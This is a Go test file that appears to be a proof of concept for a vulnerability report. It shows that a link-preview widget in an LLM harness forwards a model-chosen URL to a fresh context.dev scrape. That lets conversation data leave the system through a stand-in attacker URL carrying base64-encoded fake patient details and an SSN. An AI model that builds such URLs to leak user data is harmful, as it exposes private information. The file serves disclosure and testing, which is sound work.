package main

// Supporting PoC for the second exfiltration channel: the harness executes the
// model's render_link_preview widget by POSTing the model-chosen URL to this
// service's /metadata, and this service hands that URL to context.dev with
// maxAgeMs=0 (always a fresh scrape). Whatever the model put in the URL reaches
// the attacker's server inside context.dev's scrape request. The shipped
// handler, fetch wrapper and contextdev client are exercised; only the
// context.dev API itself is a loopback stub (as in the repo's own tests).

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/context-dot-dev/context-go-sdk/option"

	"github.com/tinfoilsh/confidential-website-metadata-fetcher/contextdev"
	"github.com/tinfoilsh/confidential-website-metadata-fetcher/fetch"
)

func TestPoC_MetadataForwardsModelChosenURLToContextDevFresh(t *testing.T) {
	exfil := "https://github.com/attacker/collect?d=W3VzZXJdIG15IHBhdGllbnQgSm9obiBRLiBQdWJsaWMsIFNTTiAxMjMtNDUtNjc4OQ"
	var got *http.Request
	stub := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		got = r.Clone(r.Context())
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte(`{"url":"` + exfil + `","type":"html","metadata":{"title":"ok","finalUrl":"` + exfil + `"}}`))
	}))
	defer stub.Close()
	client := contextdev.NewClient("poc-key", 5*time.Second, option.WithBaseURL(stub.URL))
	server := NewServer(fetch.NewFetcher(client, 1<<20), nil)
	req := httptest.NewRequest(http.MethodPost, "/metadata", strings.NewReader(`{"url":"`+exfil+`"}`))
	rec := httptest.NewRecorder()
	server.handleMetadata(rec, req)
	if got == nil {
		t.Fatal("context.dev was not called")
	}
	q := got.URL.Query()
	t.Logf("context.dev received: %s %s", got.Method, got.URL.Path)
	t.Logf("  url=%s", q.Get("url"))
	t.Logf("  maxAgeMs=%s zdr=%s (fresh scrape of the attacker URL, never served from cache)", q.Get("maxAgeMs"), q.Get("zdr"))
	t.Logf("  service answered %d: %s", rec.Code, strings.TrimSpace(rec.Body.String()))
	if q.Get("url") != exfil || q.Get("maxAgeMs") != "0" {
		t.Fatalf("unexpected upstream request: %s", got.URL.String())
	}
}
